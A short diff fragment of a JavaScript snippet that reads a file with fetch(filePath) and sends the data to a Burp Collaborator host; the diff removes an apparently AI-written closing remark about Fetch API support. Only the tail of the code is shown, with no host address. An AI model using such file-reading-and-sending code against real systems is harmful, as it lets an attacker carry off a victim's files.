@@ -20,5 +20,3 @@ fetch(filePath)
       .catch(error => console.error('Error sending data to Burp Collaborator:', error));
   })
   .catch(error => console.error('Error reading file:', error));
-
-This assumes that your environment supports the Fetch API. If you are in a different environment, please let me know so I can provide a more suitable solution.
